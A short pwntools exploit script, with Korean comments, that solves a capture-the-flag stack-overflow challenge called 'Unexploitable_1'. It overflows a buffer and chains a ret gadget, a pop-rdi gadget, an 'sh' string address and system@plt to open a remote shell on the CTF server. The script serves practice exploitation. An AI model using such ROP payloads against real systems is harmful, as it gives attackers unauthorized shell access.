from pwn import *

'''
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
'''

context(arch="amd64", os='linux')
e = ELF('./Unexploitable_1')

r = remote("ctf.j0n9hyun.xyz", 3023)

# 문제에서 system plt를 주었다
# sh문자열 만으로도 shell이 실행되기 때문에
# strings -tx 명령어로 바이너리 안에 있는 sh문자 주소를 찾았다.
# 이후는 간단히 ROP
dummy = b"A"*(0x10+8)
ret = p64(0x400541)
pop_rdi = p64(0x4007d3)
system = p64(0x400560)
sh = p64(0x4003bf)

payload  = dummy
payload += ret
payload += pop_rdi
payload += sh
payload += system

r.sendline(payload)

r.interactive()